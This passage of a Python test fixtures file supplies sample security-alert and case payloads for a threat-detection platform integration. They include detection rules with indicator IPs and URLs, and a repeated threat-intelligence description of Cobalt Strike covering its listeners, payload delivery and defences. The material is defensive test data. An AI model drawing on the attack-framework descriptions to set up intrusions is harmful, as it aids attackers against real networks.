                            "type": "openc2",
                            "name": "1",
                            "description": "Record the traffic coming from the suspicious computer for analysis based on the IP address of the traffic source",
                            "object": {
                                "action": "copy",
                                "actuator": {"network-fpc": {}},
                                "args": {"where": "$DROP_ZONE"},
                                "target": {"ip_connection": {"src-addr": "192.0.0.241"}},
                            },
                        }
                    ],
                    "x_sic_countermeasure": {"relevance": 70.0, "dynamic_relevance": 0},
                    "type": "course-of-action",
                },
                {
                    "id": "course-of-action--7aa941f8-bc0a-4438-a7f7-d70e5c2a0507",
                    "name": "Countermeasure 7aa941f8-bc0a-4438-a7f7-d70e5c2a0507",
                    "description": "Launch a forensics tool to collect information on suspicious system",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "action-steps": [
                        {
                            "type": "openc2",
                            "name": "1",
                            "description": "Launch a forensics tool to collect information on suspicious system",
                            "object": {
                                "action": "start",
                                "actuator": {"endpoint": {"ip_addr": "10.227.10.91"}},
                                "args": {"where": "$DROP_ZONE"},
                                "target": {"process": {}},
                            },
                        }
                    ],
                    "x_sic_countermeasure": {"relevance": 80.0, "dynamic_relevance": 0},
                    "type": "course-of-action",
                },
            ],
        },
        "urgency": {
            "severity": 95,
            "value": 47,
            "criticity": 0,
            "current_value": 47,
            "display": "High",
        },
        "rule": {
            "description": "Traffic associated to a Remote Administration Tool",
            "name": "RAT LightSteelBlue",
            "type": None,
            "uuid": "b686f467-fcab-412b-9633-d68982e1be82",
            "severity": 95,
            "pattern": "[ipv4-addr:value='192.0.0.241']",
        },
        "updated_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
        "similar": 0,
        "history": [
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "3060ad65-a55f-4425-8e28-54b22fd67509",
                "entry_type": "alert",
                "created_at": 1567755123,
                "alert": {"status": "Ongoing"},
                "created_by_type": "application",
            },
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "5bbaa276-3aa8-46bf-81a3-2ea3fac87867",
                "entry_type": "alert",
                "created_at": 1567755120,
                "alert": {"status": "Pending"},
                "created_by_type": "application",
            },
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "757a6a83-fa5e-499b-81de-d9fabd971b6c",
                "countermeasure": {
                    "uuid": "de66615c-4e28-4da4-bfa4-7b5caf5ee19e",
                    "status": "created",
                },
                "entry_type": "countermeasure_action_step",
                "created_at": 1567755120,
                "countermeasure_action_step": {"name": "1", "status": "created"},
                "created_by_type": "application",
            },
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "a8e7f933-dfc6-4b29-8852-1797bf6067bc",
                "countermeasure": {
                    "uuid": "51d50a83-31da-46b0-aa22-5adcd37aedb2",
                    "status": "created",
                },
                "entry_type": "countermeasure",
                "created_at": 1567755120,
                "created_by_type": "application",
            },
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "ab5ad122-2dd4-4a09-916d-d9b19247675b",
                "countermeasure": {
                    "uuid": "51d50a83-31da-46b0-aa22-5adcd37aedb2",
                    "status": "created",
                },
                "entry_type": "countermeasure_action_step",
                "created_at": 1567755120,
                "countermeasure_action_step": {"name": "1", "status": "created"},
                "created_by_type": "application",
            },
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "ef0314ba-15b6-41e8-9b7c-566f62968b2d",
                "countermeasure": {
                    "uuid": "909fda4e-6823-41bb-8998-afd75424a6b3",
                    "status": "created",
                },
                "entry_type": "countermeasure",
                "created_at": 1567755120,
                "created_by_type": "application",
            },
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "2e1a4745-ab4b-45bb-8629-50a6838fb073",
                "countermeasure": {
                    "uuid": "909fda4e-6823-41bb-8998-afd75424a6b3",
                    "status": "created",
                },
                "entry_type": "countermeasure_action_step",
                "created_at": 1567755120,
                "countermeasure_action_step": {"name": "1", "status": "created"},
                "created_by_type": "application",
            },
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "3322ee5a-2686-4712-9bbb-83a1890409e1",
                "countermeasure": {
                    "uuid": "ce4abd6b-1553-413e-b549-9392de801c52",
                    "status": "created",
                },
                "entry_type": "countermeasure",
                "created_at": 1567755120,
                "created_by_type": "application",
            },
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "db286da8-8487-4b34-803c-3ad31edbe45b",
                "countermeasure": {
                    "uuid": "ce4abd6b-1553-413e-b549-9392de801c52",
                    "status": "created",
                },
                "entry_type": "countermeasure_action_step",
                "created_at": 1567755120,
                "countermeasure_action_step": {"name": "1", "status": "created"},
                "created_by_type": "application",
            },
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "92733aa5-8bdf-4041-98e1-ba2acb1e2836",
                "countermeasure": {
                    "uuid": "d6ce6868-207c-4a59-9775-55fdd1c2318c",
                    "status": "created",
                },
                "entry_type": "countermeasure",
                "created_at": 1567755120,
                "created_by_type": "application",
            },
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "4bd9572a-e421-4eb6-92d3-a5c7d7e6d161",
                "countermeasure": {
                    "uuid": "d6ce6868-207c-4a59-9775-55fdd1c2318c",
                    "status": "created",
                },
                "entry_type": "countermeasure_action_step",
                "created_at": 1567755120,
                "countermeasure_action_step": {"name": "1", "status": "created"},
                "created_by_type": "application",
            },
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "d52c5560-51e5-461b-8224-d1332874558c",
                "countermeasure": {
                    "uuid": "ced96fc1-d6f1-4935-9978-3f367552234c",
                    "status": "created",
                },
                "entry_type": "countermeasure",
                "created_at": 1567755120,
                "created_by_type": "application",
            },
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "63407c1d-d3f5-43d2-ba5b-5dc9986f1bd9",
                "countermeasure": {
                    "uuid": "ced96fc1-d6f1-4935-9978-3f367552234c",
                    "status": "created",
                },
                "entry_type": "countermeasure_action_step",
                "created_at": 1567755120,
                "countermeasure_action_step": {"name": "1", "status": "created"},
                "created_by_type": "application",
            },
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "06404c71-cc9d-49bf-bbea-994ffbcdb923",
                "countermeasure": {
                    "uuid": "cb83cf8b-c31a-4df7-b05b-c78ef3446fc2",
                    "status": "created",
                },
                "entry_type": "countermeasure",
                "created_at": 1567755120,
                "created_by_type": "application",
            },
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "16987e43-af8a-4864-ae24-cef2ee118366",
                "countermeasure": {
                    "uuid": "cb83cf8b-c31a-4df7-b05b-c78ef3446fc2",
                    "status": "created",
                },
                "entry_type": "countermeasure_action_step",
                "created_at": 1567755120,
                "countermeasure_action_step": {"name": "1", "status": "created"},
                "created_by_type": "application",
            },
            {
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "history_comments": [],
                "uuid": "144602ea-dc46-477e-b40d-fa0c09dbd8f5",
                "countermeasure": {
                    "uuid": "de66615c-4e28-4da4-bfa4-7b5caf5ee19e",
                    "status": "created",
                },
                "entry_type": "countermeasure",
                "created_at": 1567755120,
                "created_by_type": "application",
            },
        ],
        "community_uuid": "cc93fe3f-c26b-4eb1-82f7-082209cf1892",
        "created_at": 1567755120,
        "status": {
            "uuid": "1f2f88d5-ff5b-48bf-bbbc-00c2fff82d9f",
            "name": "Ongoing",
            "description": "Countermeasures will be applied",
        },
        "target": "192.0.0.241",
    }

@pytest.fixture
def samplenotif_case_created():
    yield{
        "metadata": {
            "version": 2,
            "uuid": "e5cadc88-ce1f-455c-8792-cb7badbf1dae",
            "created_at": "2019-09-06T07:32:03.256679+00:00",
            "community_uuid": "55890e1b-b693-4c5f-b747-118f88afc30a",
        },
        "type": "case",
        "action": "created",
        "attributes": {
            "uuid": "f014aac5-2d38-49f6-a47f-ff602c734d51",
            "short_id": "CAmDUb2Anct1e",
            "manual": True,
            "title": "Test new case",
            "priority": "medium",
            "created_at": "2025-02-06T15:05:44.016485",
            "custom_priority_uuid": "d4035e46-3a60-4dc8-a91a-ac7a80d04688"
        },
    }

@pytest.fixture
def samplenotif_case_updated():
    yield {
        "metadata": {
            "version": 2,
            "uuid": "927b628a-7099-4ee4-bccb-8efdb694882d",
            "created_at": "2019-09-06T07:32:03.256679+00:00",
            "community_uuid": "55890e1b-b693-4c5f-b747-118f88afc30a",
        },
        "type": "case",
        "action": "updated",
        "attributes": {
            "uuid": "f014aac5-2d38-49f6-a47f-ff602c734d51",
            "short_id": "CAmDUb2Anct1e",
            "manual": True,
            "title": "Test new case",
            "priority": "medium",
            "created_at": "2025-02-06T15:05:44.016485",
            "custom_priority_uuid": "d4035e46-3a60-4dc8-a91a-ac7a80d04688",
            "updated": {
                "tags": ["tag1", "tag2"],
                "description": "I've updated my case"
            }
        },
    }

@pytest.fixture
def samplenotif_case_has_new_alert():
    yield {
        "metadata": {
            "version": 2,
            "uuid": "927b628a-7099-4ee4-bccb-8efdb694882d",
            "created_at": "2019-09-06T07:32:03.256679+00:00",
            "community_uuid": "55890e1b-b693-4c5f-b747-118f88afc30a",
        },
        "type": "case",
        "action": "alerts-updated",
        "attributes": {
            "uuid": "f014aac5-2d38-49f6-a47f-ff602c734d51",
            "short_id": "CAmDUb2Anct1e",
            "manual": True,
            "title": "Test new case",
            "priority": "medium",
            "created_at": "2025-02-06T15:05:44.016485",
            "custom_priority_uuid": "d4035e46-3a60-4dc8-a91a-ac7a80d04688",
            "updated": {
                "added_alerts_uuid": ["a1b8202b-b593-4f1d-9c7e-2203d53fdf48"]
            }
        },
    }

@pytest.fixture
def samplenotif_case_has_updated_alerts():
    yield {
        "metadata": {
            "version": 2,
            "uuid": "927b628a-7099-4ee4-bccb-8efdb694882d",
            "created_at": "2019-09-06T07:32:03.256679+00:00",
            "community_uuid": "55890e1b-b693-4c5f-b747-118f88afc30a",
        },
        "type": "case",
        "action": "alerts-updated",
        "attributes": {
            "uuid": "f014aac5-2d38-49f6-a47f-ff602c734d51",
            "short_id": "CAmDUb2Anct1e",
            "manual": True,
            "title": "Test new case",
            "priority": "medium",
            "created_at": "2025-02-06T15:05:44.016485",
            "custom_priority_uuid": "d4035e46-3a60-4dc8-a91a-ac7a80d04688",
            "updated": {
                "added_alerts_uuid": ["1391c809-4630-45df-91ed-8154435b9f17"],
                "deleted_alerts_uuid": ["a1b8202b-b593-4f1d-9c7e-2203d53fdf48"]
            }
        },
    }

@pytest.fixture
def sample_case_notifications(
    samplenotif_case_created,
    samplenotif_case_updated,
    samplenotif_case_has_new_alert,
    samplenotif_case_has_updated_alerts,
):
    yield [
        samplenotif_case_created,
        samplenotif_case_updated,
        samplenotif_case_has_new_alert,
        samplenotif_case_has_updated_alerts,
    ]

@pytest.fixture
def sample_siccaseapi():
    """Sample SICCaseAPI response for a case with
    UUID 296ccdd9-2f44-4dbb-aef0-35eafbfe6ae4"""

    yield {
        "uuid": "296ccdd9-2f44-4dbb-aef0-35eafbfe6ae4",
        "short_id": "CALD4s33Zrk7",
        "created_at": "2024-10-25T18:32:06.464890+00:00",
        "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
        "created_by_type": "application",
        "updated_at": "2025-03-17T15:04:04.858932+00:00",
        "updated_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
        "updated_by_type": "application",
        "title": "Malware Detection: Cobalt Strike Incident",
        "description": "Sekoia CTI alert: Potential Cobalt Strike attack detected.",
        "priority": "medium",
        "status": "opened",
        "status_uuid": "6adc2d64-87ee-4394-b8b4-0102cf80fc1b",
        "community_uuid": "52bd045f-4199-4361-8267-cdebfc784392",
        "subscribers": [],
        "tags": [],
        "number_of_comments": 0,
        "first_seen_at": "2024-10-25T12:29:08.454603Z",
        "last_seen_at": "2025-03-17T15:03:42.417292Z",
        "manual": False,
        "is_supplied": False,
        "verdict_uuid": None,
        "custom_status_uuid": None,
        "custom_priority_uuid": "d4035e46-3a60-4dc8-a91a-ac7a80d04688",
        "assignees": ["test_user_uuid"],
        "number_of_alerts": 3,
        "alerts": [
            {
                "uuid": "9dc33958-5842-441f-810b-f286824d2049",
                "title": "SEKOIA Intelligence Feed",
                "created_at": 1729859653,
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "created_by_type": "application",
                "updated_at": 1729859653,
                "updated_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "updated_by_type": "application",
                "community_uuid": "52bd045f-4199-4361-8267-cdebfc784392",
                "short_id": "ALpWf2oe9DnN",
                "entity": {
                    "uuid": "7f7676e7-a254-43c3-acf6-1b920a94fe51",
                    "name": "Information Technology Rennes site"
                },
                "urgency": {
                    "current_value": 60,
                    "value": 60,
                    "severity": 60,
                    "criticity": 0,
                    "display": "Major"
                },
                "alert_type": {
                    "value": "malware",
                    "category": "malicious-code"
                },
                "status": {
                    "uuid": "2efc4930-1442-4abb-acf2-58ba219a4fd0",
                    "name": "Pending",
                    "description": "The alert is waiting for action"
                },
                "rule": {
                    "uuid": "654dac66-b35a-4d7d-822e-05cd3e4be2a2",
                    "name": "SEKOIA Intelligence Feed",
                    "severity": 60,
                    "type": "cti",
                    "pattern": "[network-traffic:dst_ref.value = '110.42.67.31']"
                },
                "detection_type": "CTI",
                "source": "192.168.1.69",
                "target": "110.42.67.31",
                "similar": 0,
                "details": "Detect threats based on indicators of compromise (IOCs) collected by SEKOIA's Threat and Detection Research team.\r\n\r\n# Details\r\n\r\n## Malware: Cobalt Strike\r\n\r\n\n![](https://app.sekoia.io/api/v2/inthreat/images/8ab8446370cd0672b068a02511886aacfce36f2ba8a3018fdff3c15dadeaae1d.png)\n\n# Cobalt Strike, the Swiss Army Knife Framework: \n\nCobalt Strike is a paid penetration-testing tool that anyone can use. It is ubiquitous in the cyber security arena. It’s a prolific toolkit used at many levels of intrusion to solve adversaries' problems like post-intrusion exploitation, beaconing for command and control (C2s), stealth and reconnaissance. \n\nCobalt Strike is a modularized attack framework: Each module fulfills a specific function and stands alone. It’s hard to detect, because its components might be customized derivatives from another module, new, or completely absent. \n\nOver the last two years, malicious threat actors have managed to crack fully-featured versions of Cobalt Strike and made them widely available within dark web marketplaces and forums. Malicious actors find Cobalt Strike’s obfuscation techniques and robust tools for C2, stealth and data exfiltration particularly attractive.\n\nCobalt Strike is a favorite because it’s stable and highly flexible. It can be repurposed to deploy all manner of payloads, like ransomware or keylogger, to the compromised network. It is well organized and provides a framework to manage compromised assets. Essentially, this tool helps the ‘B list’ act like ‘A list’ hackers.\n\nCobalt Strike Cat is a modified version of Cobalt Strike 4.5.\n\n# Cobalt Strike architecture:\n\nThe C2 server is the Team Server, the client interface is the Aggressor, and the payload is the Beacon.\nThe listening port on the C2 server is configured through a listener.\n\nMalicious actors have used it for years to deploy “Beacon” on victim machines.\n\nListeners are at the core of Cobalt Strike. They allow adversaries to configure the C2 method used in an attack. Every attack or payload generated in Cobalt Strike requires the targeted user to select a Listener to embed within it. This will determine how an infected host will reach out to the C2 server to retrieve additional payloads and instructions. When creating a listener, the user can configure the payload type, name, C2 server and port, and other various options such as named pipes or proxy servers. \n\nUsers can choose from: \n\n* Beacon DNS\n* Beacon HTTP\n* Beacon HTTPS\n* Beacon SMB\n* Beacon TCP\n* External C2\n* Foreign HTTP\n* Foreign HTTPS\n\nPotentially the most powerful aspect of Cobalt Strike is the array of malleable C2 profiles, which allows users to configure how attacks are created, obfuscate and manage the flow of execution at a very low level.There are several ways to visualize how an adversary interacts with infected Cobalt Strike hosts, such as a session table, pivot graph, or a target table.\n\n![](https://app.sekoia.io/api/v2/inthreat/images/cc77e1ef9a2303f6d174356740c3b58035b8135c3af26ee3b2e78fe92c5894ef.png)\nFigure: Cobalt Strike Listener console\n\n![](https://app.sekoia.io/api/v2/inthreat/images/2fdff8807c594da834ec79ef89a37164ae80de6e9b937d6d37e8b0733dce3299.png)\nFigure: Cobalt Strike session table\n\n\n\n# Web Management: \n\nCobalt Strike delivers exploits and/or malicious payloads using an attacker-controlled web server. The web server can be configured to perform the following actions:\n\n* Host files\n* Clone an existing website to trick users\n* Scripted web delivery\n* Signed Applet Attack (Java)\n* Smart Applet Attack (Java)\n* System profiling\n\nWhen a victim reaches out to the Cobalt Strike web server, it’s logged for operators.\n\n# Customization: \n\nAlmot every feature is customizable through different mechanisms:\n\n* Arsenal Kits:\n\t* [Artificat Kit](https://www.cobaltstrike.com/help-artifact-kit): to modify Windows binaries templates\n\t* [Elevate Kit](https://www.cobaltstrike.com/help-elevate): to integrate privilege exploits\n\t* [Resource Kit](https://www.cobaltstrike.com/help-resource-kit): modify script payload (e.g. powershell)\n* [Malleable Profile](https://www.cobaltstrike.com/help-malleable-c2): modify C2 server and beacon behavior \n* [Aggressor Scripts](https://www.cobaltstrike.com/help-scripting): scripting language allowing multiple action on the client interface\n* [Beacon Object Files (BOFs)](https://www.cobaltstrike.com/help-beacon-object-files): extend post-exploitation functionnality\n\n\n\n# Intrusion Sets that use Cobalt Strike: \n\nIn 2020 Q3, Cobalt Strike was leveraged in more than 66% of performed attacks. It is used by cybercriminals groups as well as State-nexus intrusion sets, including :\n\n* APT19\n* APT29\n* Leviathan\n* CopyKittens\n* APT32\n* UNC2452\n* APT41\n* Chimera\n* DarkHydrus\n* Cobalt Group\n* FIN6\n* Wizard Spider\n\n\n\n# Course of action: \n\n* Cobalt Strike can be dropped in victims systems following phishing campaigns leveraging VBS scripts. It is recommended to disable document macro in MS office. Training users to notice malicous emails should also be performed on a regular basis. \n\n* Cobalt Strike payload can be delivered as a powershell script. It is recommended to restrict powershell script execution to allow signed scripts only.\n\n* Some Cobalt Strike payload signatures can be identified by antivirus. It is recommended to have a good antivirus product.\n\n* Cobalt strike beacons generate abnormal behaviors that can be hunted using Sysmon, Security, PowerShell and WMI logs: \n\t* It is recommended to hunt for parent processes spawning unexpected child processes.\n\t* Hunt for processes behaving abnormally. ex: rundll32.exe establishing a network connection without any command line arguments. \n\t* Monitor suspicious modifications to registry keys, startup folders, task scheduler and service execution.\n\t* Hunt for Anonymous and named pipes known to be specific to Cobalt Strike beacons communication.\n\n* If you have been infected by Cobalt Strike, it is recommended to carry out memory forensics. The tool [CobaltStrikeScan](https://github.com/Apr4h/CobaltStrikeScan) available on github scan for files and process memory for Cobalt Strike beacons and parse their configuration. It scans Windows process memory for evidence of DLL injection.",
                "ttps": [
                    {
                        "id": "malware--39304fbf-d301-47c3-ab06-7c96e5eb4c9b",
                        "type": "malware",
                        "name": "Cobalt Strike",
                        "description": "\n![](https://app.sekoia.io/api/v2/inthreat/images/8ab8446370cd0672b068a02511886aacfce36f2ba8a3018fdff3c15dadeaae1d.png)\n\n# Cobalt Strike, the Swiss Army Knife Framework: \n\nCobalt Strike is a paid penetration-testing tool that anyone can use. It is ubiquitous in the cyber security arena. It’s a prolific toolkit used at many levels of intrusion to solve adversaries' problems like post-intrusion exploitation, beaconing for command and control (C2s), stealth and reconnaissance. \n\nCobalt Strike is a modularized attack framework: Each module fulfills a specific function and stands alone. It’s hard to detect, because its components might be customized derivatives from another module, new, or completely absent. \n\nOver the last two years, malicious threat actors have managed to crack fully-featured versions of Cobalt Strike and made them widely available within dark web marketplaces and forums. Malicious actors find Cobalt Strike’s obfuscation techniques and robust tools for C2, stealth and data exfiltration particularly attractive.\n\nCobalt Strike is a favorite because it’s stable and highly flexible. It can be repurposed to deploy all manner of payloads, like ransomware or keylogger, to the compromised network. It is well organized and provides a framework to manage compromised assets. Essentially, this tool helps the ‘B list’ act like ‘A list’ hackers.\n\nCobalt Strike Cat is a modified version of Cobalt Strike 4.5.\n\n# Cobalt Strike architecture:\n\nThe C2 server is the Team Server, the client interface is the Aggressor, and the payload is the Beacon.\nThe listening port on the C2 server is configured through a listener.\n\nMalicious actors have used it for years to deploy “Beacon” on victim machines.\n\nListeners are at the core of Cobalt Strike. They allow adversaries to configure the C2 method used in an attack. Every attack or payload generated in Cobalt Strike requires the targeted user to select a Listener to embed within it. This will determine how an infected host will reach out to the C2 server to retrieve additional payloads and instructions. When creating a listener, the user can configure the payload type, name, C2 server and port, and other various options such as named pipes or proxy servers. \n\nUsers can choose from: \n\n* Beacon DNS\n* Beacon HTTP\n* Beacon HTTPS\n* Beacon SMB\n* Beacon TCP\n* External C2\n* Foreign HTTP\n* Foreign HTTPS\n\nPotentially the most powerful aspect of Cobalt Strike is the array of malleable C2 profiles, which allows users to configure how attacks are created, obfuscate and manage the flow of execution at a very low level.There are several ways to visualize how an adversary interacts with infected Cobalt Strike hosts, such as a session table, pivot graph, or a target table.\n\n![](https://app.sekoia.io/api/v2/inthreat/images/cc77e1ef9a2303f6d174356740c3b58035b8135c3af26ee3b2e78fe92c5894ef.png)\nFigure: Cobalt Strike Listener console\n\n![](https://app.sekoia.io/api/v2/inthreat/images/2fdff8807c594da834ec79ef89a37164ae80de6e9b937d6d37e8b0733dce3299.png)\nFigure: Cobalt Strike session table\n\n\n\n# Web Management: \n\nCobalt Strike delivers exploits and/or malicious payloads using an attacker-controlled web server. The web server can be configured to perform the following actions:\n\n* Host files\n* Clone an existing website to trick users\n* Scripted web delivery\n* Signed Applet Attack (Java)\n* Smart Applet Attack (Java)\n* System profiling\n\nWhen a victim reaches out to the Cobalt Strike web server, it’s logged for operators.\n\n# Customization: \n\nAlmot every feature is customizable through different mechanisms:\n\n* Arsenal Kits:\n\t* [Artificat Kit](https://www.cobaltstrike.com/help-artifact-kit): to modify Windows binaries templates\n\t* [Elevate Kit](https://www.cobaltstrike.com/help-elevate): to integrate privilege exploits\n\t* [Resource Kit](https://www.cobaltstrike.com/help-resource-kit): modify script payload (e.g. powershell)\n* [Malleable Profile](https://www.cobaltstrike.com/help-malleable-c2): modify C2 server and beacon behavior \n* [Aggressor Scripts](https://www.cobaltstrike.com/help-scripting): scripting language allowing multiple action on the client interface\n* [Beacon Object Files (BOFs)](https://www.cobaltstrike.com/help-beacon-object-files): extend post-exploitation functionnality\n\n\n\n# Intrusion Sets that use Cobalt Strike: \n\nIn 2020 Q3, Cobalt Strike was leveraged in more than 66% of performed attacks. It is used by cybercriminals groups as well as State-nexus intrusion sets, including :\n\n* APT19\n* APT29\n* Leviathan\n* CopyKittens\n* APT32\n* UNC2452\n* APT41\n* Chimera\n* DarkHydrus\n* Cobalt Group\n* FIN6\n* Wizard Spider\n\n\n\n# Course of action: \n\n* Cobalt Strike can be dropped in victims systems following phishing campaigns leveraging VBS scripts. It is recommended to disable document macro in MS office. Training users to notice malicous emails should also be performed on a regular basis. \n\n* Cobalt Strike payload can be delivered as a powershell script. It is recommended to restrict powershell script execution to allow signed scripts only.\n\n* Some Cobalt Strike payload signatures can be identified by antivirus. It is recommended to have a good antivirus product.\n\n* Cobalt strike beacons generate abnormal behaviors that can be hunted using Sysmon, Security, PowerShell and WMI logs: \n\t* It is recommended to hunt for parent processes spawning unexpected child processes.\n\t* Hunt for processes behaving abnormally. ex: rundll32.exe establishing a network connection without any command line arguments. \n\t* Monitor suspicious modifications to registry keys, startup folders, task scheduler and service execution.\n\t* Hunt for Anonymous and named pipes known to be specific to Cobalt Strike beacons communication.\n\n* If you have been infected by Cobalt Strike, it is recommended to carry out memory forensics. The tool [CobaltStrikeScan](https://github.com/Apr4h/CobaltStrikeScan) available on github scan for files and process memory for Cobalt Strike beacons and parse their configuration. It scans Windows process memory for evidence of DLL injection.\n\n\n"
                    }
                ],
                "adversaries": [],
                "stix": {},
                "kill_chain_short_id": "KCDbEkmkMciY",
                "first_seen_at": "2024-10-25T12:29:08.454603Z",
                "last_seen_at": "2024-10-25T12:29:08.454603Z",
                "assets": [
                    "3ee0be6f-2aa6-4a54-baf5-ffb11bdd335b"
                ],
                "time_to_detect": 4,
                "time_to_acknowledge": None,
                "time_to_respond": None,
                "time_to_resolve": None,
                "intake_uuids": [
                    "834a2d7f-3623-4b26-9f9e-c8b6e1efcc16"
                ]
            },
            {
                "uuid": "d00db9f4-4d9d-4f08-8534-276fb57b5d24",
                "title": "SEKOIA Intelligence Feed",
                "created_at": 1729881125,
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "created_by_type": "application",
                "updated_at": 1742223853,
                "updated_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "updated_by_type": "application",
                "community_uuid": "52bd045f-4199-4361-8267-cdebfc784392",
                "short_id": "ALojNWQDDYDX",
                "entity": {
                    "uuid": "7f7676e7-a254-43c3-acf6-1b920a94fe51",
                    "name": "Information Technology Rennes site"
                },
                "urgency": {
                    "current_value": 60,
                    "value": 60,
                    "severity": 60,
                    "criticity": 0,
                    "display": "Major"
                },
                "alert_type": {
                    "value": "malware",
                    "category": "malicious-code"
                },
                "status": {
                    "uuid": "2efc4930-1442-4abb-acf2-58ba219a4fd0",
                    "name": "Pending",
                    "description": "The alert is waiting for action"
                },
                "rule": {
                    "uuid": "654dac66-b35a-4d7d-822e-05cd3e4be2a2",
                    "name": "SEKOIA Intelligence Feed",
                    "severity": 60,
                    "type": "cti",
                    "pattern": "[url:value = 'https://106.55.102.97/dpixel']"
                },
                "detection_type": "CTI",
                "source": "192.168.1.47",
                "target": "106.55.102.97",
                "similar": 8,
                "details": "Detect threats based on indicators of compromise (IOCs) collected by SEKOIA's Threat and Detection Research team.\r\n\r\n# Details\r\n\r\n## Malware: Cobalt Strike\r\n\r\n\n![](https://app.sekoia.io/api/v2/inthreat/images/8ab8446370cd0672b068a02511886aacfce36f2ba8a3018fdff3c15dadeaae1d.png)\n\n# Cobalt Strike, the Swiss Army Knife Framework: \n\nCobalt Strike is a paid penetration-testing tool that anyone can use. It is ubiquitous in the cyber security arena. It’s a prolific toolkit used at many levels of intrusion to solve adversaries' problems like post-intrusion exploitation, beaconing for command and control (C2s), stealth and reconnaissance. \n\nCobalt Strike is a modularized attack framework: Each module fulfills a specific function and stands alone. It’s hard to detect, because its components might be customized derivatives from another module, new, or completely absent. \n\nOver the last two years, malicious threat actors have managed to crack fully-featured versions of Cobalt Strike and made them widely available within dark web marketplaces and forums. Malicious actors find Cobalt Strike’s obfuscation techniques and robust tools for C2, stealth and data exfiltration particularly attractive.\n\nCobalt Strike is a favorite because it’s stable and highly flexible. It can be repurposed to deploy all manner of payloads, like ransomware or keylogger, to the compromised network. It is well organized and provides a framework to manage compromised assets. Essentially, this tool helps the ‘B list’ act like ‘A list’ hackers.\n\nCobalt Strike Cat is a modified version of Cobalt Strike 4.5.\n\n# Cobalt Strike architecture:\n\nThe C2 server is the Team Server, the client interface is the Aggressor, and the payload is the Beacon.\nThe listening port on the C2 server is configured through a listener.\n\nMalicious actors have used it for years to deploy “Beacon” on victim machines.\n\nListeners are at the core of Cobalt Strike. They allow adversaries to configure the C2 method used in an attack. Every attack or payload generated in Cobalt Strike requires the targeted user to select a Listener to embed within it. This will determine how an infected host will reach out to the C2 server to retrieve additional payloads and instructions. When creating a listener, the user can configure the payload type, name, C2 server and port, and other various options such as named pipes or proxy servers. \n\nUsers can choose from: \n\n* Beacon DNS\n* Beacon HTTP\n* Beacon HTTPS\n* Beacon SMB\n* Beacon TCP\n* External C2\n* Foreign HTTP\n* Foreign HTTPS\n\nPotentially the most powerful aspect of Cobalt Strike is the array of malleable C2 profiles, which allows users to configure how attacks are created, obfuscate and manage the flow of execution at a very low level.There are several ways to visualize how an adversary interacts with infected Cobalt Strike hosts, such as a session table, pivot graph, or a target table.\n\n![](https://app.sekoia.io/api/v2/inthreat/images/cc77e1ef9a2303f6d174356740c3b58035b8135c3af26ee3b2e78fe92c5894ef.png)\nFigure: Cobalt Strike Listener console\n\n![](https://app.sekoia.io/api/v2/inthreat/images/2fdff8807c594da834ec79ef89a37164ae80de6e9b937d6d37e8b0733dce3299.png)\nFigure: Cobalt Strike session table\n\n\n\n# Web Management: \n\nCobalt Strike delivers exploits and/or malicious payloads using an attacker-controlled web server. The web server can be configured to perform the following actions:\n\n* Host files\n* Clone an existing website to trick users\n* Scripted web delivery\n* Signed Applet Attack (Java)\n* Smart Applet Attack (Java)\n* System profiling\n\nWhen a victim reaches out to the Cobalt Strike web server, it’s logged for operators.\n\n# Customization: \n\nAlmot every feature is customizable through different mechanisms:\n\n* Arsenal Kits:\n\t* [Artificat Kit](https://www.cobaltstrike.com/help-artifact-kit): to modify Windows binaries templates\n\t* [Elevate Kit](https://www.cobaltstrike.com/help-elevate): to integrate privilege exploits\n\t* [Resource Kit](https://www.cobaltstrike.com/help-resource-kit): modify script payload (e.g. powershell)\n* [Malleable Profile](https://www.cobaltstrike.com/help-malleable-c2): modify C2 server and beacon behavior \n* [Aggressor Scripts](https://www.cobaltstrike.com/help-scripting): scripting language allowing multiple action on the client interface\n* [Beacon Object Files (BOFs)](https://www.cobaltstrike.com/help-beacon-object-files): extend post-exploitation functionnality\n\n\n\n# Intrusion Sets that use Cobalt Strike: \n\nIn 2020 Q3, Cobalt Strike was leveraged in more than 66% of performed attacks. It is used by cybercriminals groups as well as State-nexus intrusion sets, including :\n\n* APT19\n* APT29\n* Leviathan\n* CopyKittens\n* APT32\n* UNC2452\n* APT41\n* Chimera\n* DarkHydrus\n* Cobalt Group\n* FIN6\n* Wizard 